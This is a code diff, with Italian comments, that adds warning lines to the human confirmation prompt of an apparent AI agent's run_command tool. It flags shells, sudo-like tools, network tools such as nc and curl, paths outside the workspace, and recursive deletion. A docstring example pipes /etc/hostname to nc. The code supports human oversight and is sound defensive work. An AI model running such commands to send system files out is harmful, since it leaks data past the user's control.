@@ -1,6 +1,7 @@
 """Presentazione degli eventi, delle conferme e delle metriche del turno."""
 
 import shlex
+from pathlib import Path
 
 from agno.run.agent import RunOutput
 
@@ -217,6 +218,86 @@ def righe_argomento(nome: str, valore) -> list:
     return righe
 
 
+# Cio' che in un comando merita una riga di attenzione. Non e' un filtro e
+# non blocca niente: `run_command` esce dal recinto per costruzione e una
+# lista nera si aggira con un alias. Serve a chi legge la conferma, che e'
+# il confine vero, per non dover riconoscere da solo un `bash -lc` in coda a
+# venti argomenti o un `/etc` dentro una riga citata.
+INTERPRETI = frozenset(
+    {"bash", "sh", "zsh", "dash", "ksh", "fish", "pwsh", "powershell", "powershell.exe", "cmd", "cmd.exe"}
+)
+ELEVAZIONE = frozenset({"sudo", "su", "doas", "pkexec", "runas"})
+RETE = frozenset({"curl", "wget", "ssh", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "telnet", "ftp"})
+
+
+def _parole(args: list) -> list:
+    """Le parole di un comando, aprendo anche la riga passata a una shell.
+
+    `['bash', '-lc', 'cat /etc/hostname | nc host 80']` ha tre elementi ma
+    dentro il terzo ci sono il percorso e la rete: senza aprirlo le
+    avvertenze vedrebbero solo la shell. `shlex.split` puo' fallire su una
+    citazione lasciata aperta; allora si divide sugli spazi, che e' meno
+    preciso ma non lascia la riga chiusa.
+    """
+    parole = []
+    for indice, pezzo in enumerate(args):
+        parole.append(pezzo)
+        if indice and args[0].rsplit("/", 1)[-1].lower() in INTERPRETI and args[indice - 1].startswith("-"):
+            try:
+                parole.extend(shlex.split(pezzo))
+            except ValueError:
+                parole.extend(pezzo.split())
+    return parole
+
+
+def avvertenze_comando(args, radice=None) -> list:
+    """Le righe di attenzione per un comando da autorizzare, o nessuna.
+
+    Ogni riga nomina un fatto, non un giudizio: passa da una shell, tocca un
+    percorso fuori dalla directory, chiede privilegi, usa la rete, cancella
+    ricorsivamente. Sono i casi in cui il comando puo' fare piu' di quello che
+    la directory di lavoro lascia intendere, e quelli in cui un'istruzione
+    arrivata da un file o da un output tende a finire.
+    """
+    if not isinstance(args, list) or not all(isinstance(v, str) for v in args) or not args:
+        return []
+    parole = _parole(args)
+    comandi = {p.rsplit("/", 1)[-1].lower() for p in parole}
+    avvertenze = []
+    if args[0].rsplit("/", 1)[-1].lower() in INTERPRETI:
+        avvertenze.append(
+            "passa da una shell: la riga dentro puo' uscire dalla directory, leggere l'ambiente e usare la rete"
+        )
+    fuori = []
+    for parola in parole:
+        candidato = parola.split("=", 1)[-1] if "=" in parola else parola
+        assoluto = candidato.startswith(("/", "~")) or candidato[1:3] == ":\\"
+        risale = ".." in candidato.replace("\\", "/").split("/")
+        if (assoluto or risale) and (radice is None or not _dentro(candidato, radice)):
+            fuori.append(parola)
+    if fuori:
+        avvertenze.append("tocca percorsi fuori dalla directory: " + ", ".join(dict.fromkeys(fuori)))
+    if comandi & ELEVAZIONE:
+        avvertenze.append("chiede privilegi di amministratore: " + ", ".join(sorted(comandi & ELEVAZIONE)))
+    if comandi & RETE:
+        avvertenze.append("usa la rete: " + ", ".join(sorted(comandi & RETE)))
+    if "rm" in comandi and any(p.startswith("-") and "r" in p.lower() for p in parole):
+        avvertenze.append("cancella ricorsivamente")
+    return ["   attenzione: " + riga for riga in avvertenze]
+
+
+def _dentro(percorso: str, radice) -> bool:
+    """Vero se un percorso assoluto sta sotto la radice del workspace."""
+    if percorso.startswith("~"):
+        return False
+    try:
+        # Relativo alla radice, non alla directory corrente: e' li' che
+        # `run_command` esegue, quindi `../x` si conta da li'.
+        return Path(radice, percorso).resolve().is_relative_to(Path(radice).resolve())
+    except (OSError, ValueError):
+        return False
+
+
 def righe_richiesta(esecuzione, radice=None) -> list:
     """Descrive per intero cio' che si sta per autorizzare.
 
@@ -225,6 +306,8 @@ def righe_richiesta(esecuzione, radice=None) -> list:
     la shell, e `run_command` risponde su `/etc/hostname`: la conferma umana e'
     quindi l'unico controllo che resta davvero. Se e' l'unico, quello che
     l'utente legge in quel momento e' un pezzo del confine, non presentazione.
+    Le righe di attenzione seguono gli argomenti e precedono la directory:
+    dicono cosa, in quegli argomenti, va oltre la directory.
     """
     righe = ["Ares chiede di eseguire: " + str(esecuzione.tool_name)]
     argomenti = esecuzione.tool_args or {}
@@ -232,6 +315,8 @@ def righe_richiesta(esecuzione, radice=None) -> list:
         righe.append("   (senza argomenti)")
     for nome, valore in argomenti.items():
         righe.extend(righe_argomento(str(nome), valore))
+    if str(esecuzione.tool_name or "").endswith("run_command"):
+        righe.extend(avvertenze_comando(argomenti.get("args"), radice))
     if radice is not None:
         # Per un `delete_file` il percorso e' relativo alla radice: senza
         # questa riga l'utente autorizza `note.md` senza sapere quale.
